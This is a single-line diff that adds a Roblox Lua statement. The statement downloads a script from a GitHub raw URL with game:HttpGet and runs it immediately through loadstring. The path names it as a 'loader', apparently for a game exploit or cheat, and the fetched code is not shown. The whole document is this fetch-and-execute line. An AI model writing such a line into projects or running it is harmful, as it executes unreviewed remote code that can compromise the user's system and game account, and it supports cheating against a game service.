@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/2x-exp-warden-sonaria-horror-escape-spam7-wptknilrmasxgy.lua"))()
